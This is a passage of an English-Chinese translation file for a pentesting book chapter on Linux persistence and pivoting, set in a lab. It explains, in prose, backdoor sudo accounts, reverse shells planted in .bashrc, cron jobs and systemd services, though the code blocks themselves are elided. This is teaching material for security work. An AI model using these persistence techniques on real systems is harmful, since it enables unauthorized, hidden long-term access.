@@ -1,19 +1,25 @@
 - en: '12'
+  id: totrans-0
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: '12'
 - en: Persistence and Pivoting
+  id: totrans-1
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 持久化与转发
 - en: This chapter focuses on the techniques of **persistence** and **pivoting** in
     pentesting, specifically using the Bash shell. We’ll cover methods for maintaining
     long-term access to compromised systems and expanding access within a network.
     Then, we’ll cover both basic and advanced persistence techniques, network pivoting
     strategies, and methods for **lateral movement** . We’ll also address the importance
     of proper cleanup procedures to minimize detectable traces of pentesting activities.
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章重点介绍渗透测试中的**持久化**和**转发**技术，特别是使用Bash Shell。我们将涵盖保持长期访问被攻破系统和在网络中扩展访问的方法。接着，我们将介绍基本和高级的持久化技术、网络转发策略以及**横向移动**的方法。我们还将讨论适当清理程序的重要性，以减少渗透测试活动的可检测痕迹。
 - en: The sections in this chapter progress from fundamental persistence concepts
     to more sophisticated approaches, followed by an exploration of network pivoting
     tactics. In doing so, you’ll learn about using cron jobs, startup scripts, and
@@ -21,1057 +27,1579 @@
     including port forwarding and tunneling with SSH. We’ll conclude by providing
     guidance on log cleaning, erasing command histories, and managing digital footprints
     to maintain operational security during pentests.
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章的各节内容从基础的持久化概念到更复杂的方法，接着是网络转发策略的探索。通过这些内容，您将学习如何使用cron作业、启动脚本和系统级服务来实现持久化。我们将涵盖各种转发技术，包括端口转发和通过SSH隧道的转发。最后，我们将提供清理日志、删除命令历史记录和管理数字足迹的指导，以在渗透测试期间保持操作安全。
 - en: 'In this chapter, we’re going to cover the following main topic s:'
+  id: totrans-4
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章将涵盖以下主要内容：
 - en: The fundamentals of persistence with Ba sh
+  id: totrans-5
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 使用Bash进行持久化的基础
 - en: Learning advanced persistence techniqu es
+  id: totrans-6
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 学习高级持久化技术
 - en: The basics of network pivoting with Ba sh
+  id: totrans-7
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 使用Bash进行网络转发的基础
 - en: Mastering advanced pivoting and lateral movement
+  id: totrans-8
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 精通高级转发和横向移动
 - en: Cleanup and covering tracks
+  id: totrans-9
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 清理和掩盖痕迹
 - en: Technical requirements
+  id: totrans-10
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 技术要求
 - en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12)
     .
+  id: totrans-11
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章的代码可以在[https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12)找到。
 - en: If you want to follow along with the exercises, you need to have a Kali and
     **ESCALATE_LINUX** virtual machine available.
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果您希望跟随练习，您需要有一个Kali和**ESCALATE_LINUX**虚拟机。
 - en: 'Enter the following command to install the prerequisites on your Kali Linux
     system:'
+  id: totrans-13
   prefs: []
   type: TYPE_NORMAL
+  zh: 输入以下命令在Kali Linux系统上安装先决条件：
 - en: '[PRE0]'
+  id: totrans-14
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE0]'
 - en: See [*Chapter 11*](B22229_11.xhtml#_idTextAnchor317) for the **ESCALATE_LINUX**
     download link and configuration instructions.
+  id: totrans-15
   prefs: []
   type: TYPE_NORMAL
+  zh: 请参阅[*第11章*](B22229_11.xhtml#_idTextAnchor317)获取**ESCALATE_LINUX**下载链接和配置说明。
 - en: Tip
+  id: totrans-16
   prefs: []
   type: TYPE_NORMAL
+  zh: 提示
 - en: The **ESCALATE_LINUX** virtual machine will be referred to as *target* through
     the rest of this chapter.
+  id: totrans-17
   prefs: []
   type: TYPE_NORMAL
+  zh: '**ESCALATE_LINUX**虚拟机将在本章中被称为*目标*。'
 - en: Some initial setup of the target is required before we can start the next section.
     In [*Chapter 11*](B22229_11.xhtml#_idTextAnchor317) , we escalated privileges
     to root and cracked the root password. The root password was **12345** .
+  id: totrans-18
   prefs: []
   type: TYPE_NORMAL
+  zh: 在我们开始下一节之前，需要对目标进行一些初步设置。在[*第11章*](B22229_11.xhtml#_idTextAnchor317)中，我们已经提升了root权限并破解了root密码。root密码是**12345**。
 - en: 'Here, **user1** on the target has sudo rights, as shown in the following figure:'
+  id: totrans-19
   prefs: []
   type: TYPE_NORMAL
+  zh: 在此，目标上的**user1**具有sudo权限，如下图所示：
 - en: '![Figure 12.1 – An entry from /etc/sudoers is shown](image/B22229_12_01.jpg)'
+  id: totrans-20
   prefs: []
   type: TYPE_IMG
+  zh: '![图12.1 – 显示了/etc/sudoers中的一条条目](image/B22229_12_01.jpg)'
 - en: Figure 12.1 – An entry from /etc/sudoers is shown
+  id: totrans-21
   prefs: []
   type: TYPE_NORMAL
+  zh: 图12.1 – 显示了/etc/sudoers中的一条条目
 - en: We’ll set the password for **user1** and use this account for all of the exercises
     in this chapter. This will simulate us having exploited a user account with **sudo**
     rights and set the stage for following along with the instructions.
+  id: totrans-22
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们将为**user1**设置密码，并使用该账户完成本章的所有练习。这将模拟我们利用具有**sudo**权限的用户账户，并为后续的操作做准备。
 - en: Exploit the web application on the target again to get a shell as **user6**
     . Please refer to [*Chapter 11*](B22229_11.xhtml#_idTextAnchor317) for guidance
     if you need a refresher on how to do so.
+  id: totrans-23
   prefs: []
   type: TYPE_NORMAL
+  zh: 再次利用目标上的Web应用程序获得**user6**的shell。如果您需要复习相关操作，请参阅[*第11章*](B22229_11.xhtml#_idTextAnchor317)。
 - en: 'Before you move on, you’ll need to establish an interactive shell. Enter the
     **su root** command and observe that the output says **su: must be run from a
     terminal** . To fix this, enter the following command:'
+  id: totrans-24
   prefs: []
   type: TYPE_NORMAL
+  zh: '在继续之前，你需要建立一个交互式shell。输入**su root**命令，观察输出信息显示**su: must be run from a terminal**。要解决此问题，输入以下命令：'
 - en: '[PRE1]'
+  id: totrans-25
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE1]'
 - en: 'Then, enter the **su root** command and enter **12345** as the password when
     prompted. Finally, enter th e **echo "user1:12345" |** **chpasswd** command:'
+  id: totrans-26
   prefs: []
   type: TYPE_NORMAL
+  zh: 然后，输入**su root**命令，并在提示时输入**12345**作为密码。最后，输入**echo "user1:12345" | chpasswd**命令：
 - en: '![Figure 12.2 – Setting the password for user1](image/B22229_12_02.jpg)'
+  id: totrans-27
   prefs: []
   type: TYPE_IMG
+  zh: '![图12.2 – 设置user1的密码](image/B22229_12_02.jpg)'
 - en: Figure 12.2 – Setting the password for user1
+  id: totrans-28
   prefs: []
   type: TYPE_NORMAL
+  zh: 图12.2 – 设置user1的密码
 - en: Tip
+  id: totrans-29
   prefs: []
   type: TYPE_NORMAL
+  zh: 提示
 - en: You’ve probably noticed by now that the shell is echoing your commands back
     to you. To stop this, enter the **stty -** **echo** command.
+  id: totrans-30
   prefs: []
   type: TYPE_NORMAL
+  zh: 你可能已经注意到，shell正在回显你输入的命令。要停止这一现象，可以输入**stty -echo**命令。
 - en: 'Finally, we must enter **exit** to exit out of the root prompt and enter **su
     user1** and **12345** when prompted for the password. You should now see a prompt
     for **user1** , as shown in the following figure:'
+  id: totrans-31
   prefs: []
   type: TYPE_NORMAL
+  zh: 最后，我们必须输入**exit**以退出root提示符，并在提示输入密码时输入**su user1**和**12345**。现在你应该能看到**user1**的提示符，如下图所示：
 - en: '![Figure 12.3 – Switching users to the user1 account](image/B22229_12_03.jpg)'
+  id: totrans-32
   prefs: []
   type: TYPE_IMG
+  zh: '![图12.3 – 切换到user1账户](image/B22229_12_03.jpg)'
 - en: Figure 12.3 – Switching users to the user1 account
+  id: totrans-33
   prefs: []
   type: TYPE_NORMAL
+  zh: 图12.3 – 切换到user1账户
 - en: With these initial setup steps out of the way, you’re ready to dive in and take
     on the exercises that follow.
+  id: totrans-34
   prefs: []
   type: TYPE_NORMAL
+  zh: 完成这些初步设置后，你就可以开始接下来的练习了。
 - en: The fundamentals of persistence with Bash
+  id: totrans-35
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: Bash持久性的基本原理
 - en: Persistence refers to maintaining access to a compromised system after the initial
     exploitation. For pentesters assessing Linux systems, understanding Bash-based
     persistence techniques is essential. This section covers some fundamental methods
     for establishing persistence using Bash.
+  id: totrans-36
   prefs: []
   type: TYPE_NORMAL
+  zh: 持久性是指在初始利用后，继续保持对被攻陷系统的访问权限。对于评估Linux系统的渗透测试人员来说，了解基于Bash的持久性技术至关重要。本节将介绍一些使用Bash建立持久性的方法。
 - en: Creating a new user in Bash
+  id: totrans-37
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 在Bash中创建新用户
 - en: 'One basic technique is to create a new user account with root privileges. See
     the following example for the commands to add a new user with root privileges:'
+  id: totrans-38
   prefs: []
   type: TYPE_NORMAL
+  zh: 一种基本技巧是创建一个具有root权限的新用户账户。请参见以下示例，了解添加具有root权限新用户的命令：
 - en: '[PRE2]'
+  id: totrans-39
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE2]'
 - en: These commands create a new user named **bashdoor** , add them to the **sudo**
     group, and set their password to **password123** . The new user will have full
     root access.
+  id: totrans-40
   prefs: []
   type: TYPE_NORMAL
+  zh: 这些命令会创建一个名为**bashdoor**的新用户，将其添加到**sudo**组，并将密码设置为**password123**。新用户将拥有完全的root权限。
 - en: 'Let’s take a closer look at how this works:'
+  id: totrans-41
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们更详细地看看这个过程是如何进行的：
 - en: '**useradd** : Creates the new user account'
+  id: totrans-42
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**useradd** ：创建新用户账户'
 - en: '**-m** : Creates a home directory'
+  id: totrans-43
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**-m** ：创建主目录'
 - en: '**-s** : Sets the login shell to **bash**'
+  id: totrans-44
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**-s** ：将登录shell设置为**bash**'
 - en: '**usermod -aG** : Adds the user to the **sudo** group'
+  id: totrans-45
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**usermod -aG** ：将用户添加到**sudo**组'
 - en: '**chpasswd** : Sets the password'
+  id: totrans-46
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**chpasswd** ：设置密码'
 - en: 'Let’s see this in action:'
+  id: totrans-47
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们看看这个操作是如何进行的：
 - en: '![Figure 12.4 – The process for adding a new user with full sudo privileges](image/B22229_12_04.jpg)'
+  id: totrans-48
   prefs: []
   type: TYPE_IMG
+  zh: '![图12.4 – 添加具有完全sudo权限的新用户的过程](image/B22229_12_04.jpg)'
 - en: Figure 12.4 – The process for adding a new user with full sudo privileges
+  id: totrans-49
   prefs: []
   type: TYPE_NORMAL
+  zh: 图12.4 – 添加具有完全sudo权限的新用户的过程
 - en: Adding a new user is noisy and is likely to be noticed. It may be less likely
     to be noticed if you simply add a backdoor shell to an existing user. We’ll explore
     this technique next.
+  id: totrans-50
   prefs: []
   type: TYPE_NORMAL
+  zh: 添加新用户是一个比较显眼的操作，可能会被注意到。如果你只是给现有用户添加一个后门shell，则可能不容易被发现。接下来我们将探讨这种技术。
 - en: Backdooring the Bash shell
+  id: totrans-51
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 给Bash shell添加后门
 - en: The **~/.bashrc** file is executed whenever a new interactive Bash shell is
     opened. We can add commands here.
+  id: totrans-52
   prefs: []
   type: TYPE_NORMAL
+  zh: '**~/.bashrc** 文件会在每次打开新的交互式Bash shell时执行。我们可以在这里添加命令。'
 - en: 'Before continuing, exit the **bashdoor** Terminal session so that you’re back
     at the prompt for **user1** . Enter the following command in your Kali Terminal
     to ensure you’re ready to catch the reverse shell:'
+  id: totrans-53
   prefs: []
   type: TYPE_NORMAL
+  zh: 在继续之前，退出**bashdoor**的终端会话，以便返回到**user1**的提示符。接下来，在Kali终端中输入以下命令，确保你已经准备好接收反向shell：
 - en: '[PRE3]'
+  id: totrans-54
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE3]'
 - en: 'In your **user1** shell, enter the following command, replacing the IP address
     and port with you r own:'
+  id: totrans-55
   prefs: []
   type: TYPE_NORMAL
+  zh: 在**user1**的shell中，输入以下命令，并用你自己的IP地址和端口替换：
 - en: '[PRE4]'
+  id: totrans-56
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE4]'
 - en: This adds a reverse shell command to the user’s **~/.bashrc** file. It will
     connect back to the attacker’s machine each time a new Terminal is opened.
+  id: totrans-57
   prefs: []
   type: TYPE_NORMAL
+  zh: 这将把一个反向shell命令添加到用户的**~/.bashrc**文件中。每次打开新的终端时，它都会连接回攻击者的机器。
 - en: Then, establish a new session as **user1** with the **su** **user1** command.
+  id: totrans-58
   prefs: []
   type: TYPE_NORMAL
+  zh: 然后，使用 **su** **user1** 命令以 **user1** 身份建立一个新会话。
 - en: 'You should see a new session as **user1** in the Terminal where you ran **nc**
     , as shown in the following figure:'
+  id: totrans-59
   prefs: []
   type: TYPE_NORMAL
+  zh: 你应该在运行 **nc** 的终端看到一个新的 **user1** 会话，如下图所示：
 - en: '![Figure 12.5 – Our reverse shell has been established](image/B22229_12_05.jpg)'
+  id: totrans-60
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.5 – 我们的反向 Shell 已经建立](image/B22229_12_05.jpg)'
 - en: Figure 12.5 – Our reverse shell has been established
+  id: totrans-61
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.5 – 我们的反向 Shell 已经建立
 - en: Tip
+  id: totrans-62
   prefs: []
   type: TYPE_NORMAL
+  zh: 提示
 - en: If you make a mistake when using **echo** to append to the end of the **.bashrc**
     file, it may be difficult to remove using an editor due to shell limitations.
     You can enter the **sed -i '$d' filename** command to delete the last line of
     a file.
+  id: totrans-63
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果你在使用 **echo** 命令将内容追加到 **.bashrc** 文件末尾时出错，可能由于 Shell 限制而很难通过编辑器删除。你可以输入 **sed
+    -i '$d' filename** 命令删除文件的最后一行。
 - en: In addition to Bash reverse shell backdoors in **.bashrc** , scheduled jobs
     are another effective way to maintain persistence on a Linux system in Bash.
+  id: totrans-64
   prefs: []
   type: TYPE_NORMAL
+  zh: 除了 **.bashrc** 中的 Bash 反向 Shell 后门外，定时作业是另一种有效的方式，用于在 Linux 系统中维持 Bash 环境的持久性。
 - en: Creating backdoor cron jobs
+  id: totrans-65
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 创建后门 cron 作业
 - en: Linux **cron jobs** are scheduled tasks that run automatically at specified
     intervals. The **cron daemon** is a background service that executes these scheduled
     commands, scripts, or programs.
+  id: totrans-66
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux **cron 作业** 是定期自动运行的任务。**cron 守护进程** 是一个后台服务，它执行这些预定的命令、脚本或程序。
 - en: 'Cron jobs are defined in crontab files, which contain the schedule and command
     to run. Each line in a crontab file represents a single job and follows this format:'
+  id: totrans-67
   prefs: []
   type: TYPE_NORMAL
+  zh: cron 作业在 crontab 文件中定义，文件中包含任务的安排和执行命令。每一行代表一个作业，并遵循以下格式：
 - en: '[PRE5]'
+  id: totrans-68
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE5]'
 - en: 'The five asterisks represent the following aspects:'
+  id: totrans-69
   prefs: []
   type: TYPE_NORMAL
+  zh: 五个星号代表以下几个方面：
 - en: Minute (0-59)
+  id: totrans-70
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 分钟（0-59）
 - en: Hour (0-23)
+  id: totrans-71
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 小时（0-23）
 - en: Day of month (1-31)
+  id: totrans-72
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 日（1-31）
 - en: Month (1-12)
+  id: totrans-73
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 月份（1-12）
 - en: Day of week (0-7, where 0 and 7 are Sunday)
+  id: totrans-74
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 星期几（0-7，其中 0 和 7 代表星期天）
 - en: 'Users can edit their crontab file using the **crontab -e** command. Here’s
     an example of a cron job that runs a script every day at 3:30 A.M.:'
+  id: totrans-75
   prefs: []
   type: TYPE_NORMAL
+  zh: 用户可以使用 **crontab -e** 命令编辑他们的 crontab 文件。以下是一个示例，表示每天 3:30 A.M. 运行脚本的 cron 作业：
 - en: '[PRE6]'
+  id: totrans-76
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE6]'
 - en: To view existing cron jobs, use the **crontab -** **l** command.
+  id: totrans-77
   prefs: []
   type: TYPE_NORMAL
+  zh: 要查看现有的 cron 作业，可以使用 **crontab -** **l** 命令。
 - en: 'For pentesters, cron jobs are important in post-exploitation and maintaining
     access for several reasons:'
+  id: totrans-78
   prefs: []
   type: TYPE_NORMAL
+  zh: 对于渗透测试者来说，cron 作业在后期利用和维持访问中非常重要，原因有很多：
 - en: '**Persistence** : Attackers can use cron jobs to maintain access to a compromised
     system by scheduling tasks that re-establish connections or download updated malware.'
+  id: totrans-79
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**持久性** : 攻击者可以使用 cron 作业通过安排任务来保持对被攻破系统的访问，这些任务会重新建立连接或下载更新的恶意软件。'
 - en: '**Data exfiltration** : Cron jobs can be set up to send sensitive data from
     the compromised system to an attacker-controlled server regularly.'
+  id: totrans-80
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**数据外泄** : 可以设置 cron 作业定期将敏感数据从受损系统发送到攻击者控制的服务器。'
 - en: '**Privilege escalation** : If an attacker can create or modify cron jobs running
     as root or other privileged users, they can potentially escalate their privileges
     on the system.'
+  id: totrans-81
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**权限提升** : 如果攻击者能够创建或修改以 root 或其他特权用户身份运行的 cron 作业，他们可能会在系统上提升自己的权限。'
 - en: '**Backdoor maintenance** : Cron jobs can be used to periodically check for
     and repair any backdoors that may have been removed or disabled.'
+  id: totrans-82
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**后门维护** : cron 作业可以定期检查并修复任何可能被删除或禁用的后门。'
 - en: '**Evading detection** : By scheduling malicious activities at specific times,
     attackers can potentially avoid detection by timing their actions when system
     administrators are less likely to be monitoring the system.'
+  id: totrans-83
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**避开检测** : 通过在特定时间安排恶意活动，攻击者可以通过在系统管理员不太可能监控系统的时间执行操作，从而避开检测。'
 - en: '**Automated reconnaissance** : Attackers can use cron jobs to gather information
     about the system or network regularly, helping them plan further attacks or identify
     new vulnerabilities.'
+  id: totrans-84
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**自动化侦察** : 攻击者可以利用 cron 作业定期收集关于系统或网络的信息，帮助他们规划进一步的攻击或识别新的漏洞。'
 - en: 'Cron jobs can be used to maintain persistence by scheduling malicious commands.
     Here’s an example:'
+  id: totrans-85
   prefs: []
   type: TYPE_NORMAL
+  zh: cron 作业可以通过安排恶意命令来维持持久性。以下是一个示例：
 - en: '[PRE7]'
+  id: totrans-86
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE7]'
 - en: This creates a cron job that attempts to establish a reverse shell connection
     every 5 minutes.
+  id: totrans-87
   prefs: []
   type: TYPE_NORMAL
+  zh: 这会创建一个 cron 作业，每 5 分钟尝试建立一个反向 Shell 连接。
 - en: 'Here’s how it works:'
+  id: totrans-88
   prefs: []
   type: TYPE_NORMAL
+  zh: 其工作原理如下：
 - en: '**echo** : This adds the new cron job.'
+  id: totrans-89
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**echo** : 这将添加一个新的 cron 作业。'
 - en: '***/5 * * * *** : This sets the schedule to every 5 minutes.'
+  id: totrans-90
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '***/5 * * * *** : 这将设置每 5 分钟执行一次任务。'
 - en: The command creates a reverse shell (change the IP address and port as required).
+  id: totrans-91
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 该命令创建一个反向 shell（根据需要更改 IP 地址和端口）。
 - en: '**| crontab -** : This installs the new crontab.'
+  id: totrans-92
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**| crontab -**：这会安装新的 crontab。'
 - en: 'Let’s see this in action. On the target system, we execute the command to create
     the cron job, followed immediately by the command to list all cron jobs. On the
     Kali system, within 5 minutes, we have our shell. This is demonstrated in the
     following screenshots; the following one shows the commands that have been executed
     on the target:'
+  id: totrans-93
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们看看实际操作。在目标系统上，我们执行命令来创建 cron 任务，接着立刻执行列出所有 cron 任务的命令。在 Kali 系统上，5 分钟内，我们就能得到
+    shell。以下截图展示了这一过程；下面的截图显示了在目标系统上已执行的命令：
 - en: '![Figure 12.6 – We create the cron job for persistence on the target system](image/B22229_12_06.jpg)'
+  id: totrans-94
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.6 – 我们在目标系统上创建 cron 任务以实现持久性](image/B22229_12_06.jpg)'
 - en: Figure 12.6 – We create the cron job for persistence on the target system
+  id: totrans-95
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.6 – 我们在目标系统上创建 cron 任务以实现持久性
 - en: 'The following figure shows us receiving the reverse shell on Kali:'
+  id: totrans-96
   prefs: []
   type: TYPE_NORMAL
+  zh: 下图展示了我们在 Kali 上接收到反向 shell：
 - en: '![Figure 12.7 – We capture our reverse shell from the cron job on the Kali
     system](image/B22229_12_07.jpg)'
+  id: totrans-97
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.7 – 我们从 Kali 系统的 cron 任务中捕获反向 shell](image/B22229_12_07.jpg)'
 - en: Figure 12.7 – We capture our reverse shell from the cron job on the Kali system
+  id: totrans-98
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.7 – 我们从 Kali 系统的 cron 任务中捕获反向 shell
 - en: Understanding cron jobs is a key skill for privilege escalation and maintaining
     access post-exploitation. Next, we’ll look into backdooring system files for persistence.
+  id: totrans-99
   prefs: []
   type: TYPE_NORMAL
+  zh: 理解 cron 任务是提权和维持访问权限的关键技能。接下来，我们将研究如何通过后门化系统文件来实现持久性。
 - en: Backdooring system files for persistence
+  id: totrans-100
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 后门化系统文件以实现持久性
 - en: Linux system **.service** files are configuration files that are used by systemd,
     the init system, and service manager for many modern Linux distributions. These
     files define how systemd should manage and control services, daemons, or background
     processes.
+  id: totrans-101
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux 系统的 **.service** 文件是配置文件，用于系统d，许多现代 Linux 发行版的初始化系统和服务管理器。这些文件定义了 systemd
+    如何管理和控制服务、守护进程或后台进程。
 - en: 'The following are the key aspects of **.** **service** files:'
+  id: totrans-102
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下是 **.** **service** 文件的关键部分：
 - en: '**Location** : Typically stored in **/etc/systemd/system/** or **/usr/lib/systemd/system/**'
+  id: totrans-103
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**位置**：通常存储在 **/etc/systemd/system/** 或 **/usr/lib/systemd/system/** 中'
 - en: '**Naming** **convention** : **[service_name].service**'
+  id: totrans-104
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**命名约定**：**[service_name].service**'
 - en: '**Structure** : Consists of sections such as **[Unit]** , **[Service]** , and
     **[Install]**'
+  id: totrans-105
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**结构**：由 **[Unit]**、**[Service]** 和 **[Install]** 等部分组成'
 - en: '**Purpose** : Defines service behavior, dependencies, start/stop commands,
     and more'
+  id: totrans-106
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**目的**：定义服务行为、依赖关系、启动/停止命令等'
 - en: 'Here’s a basic example of a **.** **service** file:'
+  id: totrans-107
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是一个基本的 **.** **service** 文件示例：
 - en: '[PRE8]'
+  id: totrans-108
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE8]'
 - en: 'This file defines the following:'
+  id: totrans-109
   prefs: []
   type: TYPE_NORMAL
+  zh: 该文件定义了以下内容：
 - en: A description of the service
+  id: totrans-110
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 服务的描述
 - en: When it should start (after the network is up)
+  id: totrans-111
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 它应在何时启动（网络启动后）
 - en: The command to execute when starting the service
+  id: totrans-112
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 启动服务时要执行的命令
 - en: Restart behavior if it fails
+  id: totrans-113
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果服务失败，重新启动的行为
 - en: The user under which the service should run
+  id: totrans-114
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 服务应运行的用户
 - en: Where the service should be installed in the system’s boot sequence
+  id: totrans-115
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 服务应安装在系统启动序列中的位置
 - en: 'Modifying system service files can provide persistence that survives reboots.
     This is demonstrated in the following command, which can be found in this chapter’s
     GitHub repository as **ch12_persistence.service.sh** . Please note that the ExecStart
     Bash reverse shell command is one line and may wrap due to bo ok formatting:'
+  id: totrans-116
   prefs: []
   type: TYPE_NORMAL
+  zh: 修改系统服务文件可以提供在重启后仍然有效的持久性。这一点在以下命令中得到了展示，命令可以在本章的 GitHub 仓库中找到，文件名为 **ch12_persistence.service.sh**。请注意，ExecStart
+    Bash 反向 shell 命令为一行，可能因排版问题换行：
 - en: '[PRE9]'
+  id: totrans-117
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE9]'
 - en: This creates a new systemd service that establishes a reverse shell connection
     on system startup.
+  id: totrans-118
   prefs: []
   type: TYPE_NORMAL
+  zh: 这会创建一个新的 systemd 服务，在系统启动时建立反向 shell 连接。
 - en: 'Here’s an explanation for this code:'
+  id: totrans-119
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是该代码的解释：
 - en: '**tee -a** creates the service file.'
+  id: totrans-120
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**tee -a** 创建服务文件。'
 - en: The **<<** redirection sends everything between the EOF labels to the service
     file.
+  id: totrans-121
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**<<** 重定向将 EOF 标签之间的所有内容发送到服务文件。'
 - en: The **[Unit]** , **[Service]** , and **[Install]** sections define the service.
+  id: totrans-122
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**[Unit]**、**[Service]** 和 **[Install]** 部分定义了服务。'
 - en: '**ExecStart** specifies the command to run.'
+  id: totrans-123
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**ExecStart** 指定了要执行的命令。'
 - en: '**systemctl enable** sets the service to start on boot.'
+  id: totrans-124
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**systemctl enable** 设置服务在启动时自动启动。'
 - en: '**systemctl start** runs the service immediately.'
+  id: totrans-125
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**systemctl start** 会立即运行该服务。'
 - en: Let’s see this in action. First, I’ll run the **python3 -m http.server** command
     on my Kali system to run an HTTP server for file transfer. Then, I’ll use **wget**
     on the target system to download the file from Kali, saving the file to **/tmp**
     . Next, I’ll make the file executable and execute it. On Kali, I’ll check my Terminal
     and find that I’ve received the reverse shell and have a session as the root user.
     This is demonstrated in the following figures.
+  id: totrans-126
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们看看这个实际操作。首先，我将在我的 Kali 系统上运行 **python3 -m http.server** 命令，启动一个 HTTP 服务器用于文件传输。接着，我将在目标系统上使用
+    **wget** 从 Kali 下载文件，并将文件保存到 **/tmp**。然后，我会将文件设置为可执行并执行它。在 Kali 上，我会查看我的终端并发现我已经获得了反向
+    Shell 并作为 root 用户建立了会话。以下图示展示了这一过程。
 - en: 'In the following figure, you can see that the Python server has been started
     on the Kali system:'
+  id: totrans-127
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下图中，您可以看到 Python 服务器已在 Kali 系统上启动：
 - en: '![Figure 12.8 – We run an HTTP server for file transfer](image/B22229_12_08.jpg)'
+  id: totrans-128
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.8 – 我们运行 HTTP 服务器用于文件传输](image/B22229_12_08.jpg)'
 - en: Figure 12.8 – We run an HTTP server for file transfer
+  id: totrans-129
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.8 – 我们运行 HTTP 服务器用于文件传输
 - en: 'The following figure shows the commands that were run on the target system
     to download the script:'
+  id: totrans-130
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下图示展示了在目标系统上运行的命令，用于下载脚本：
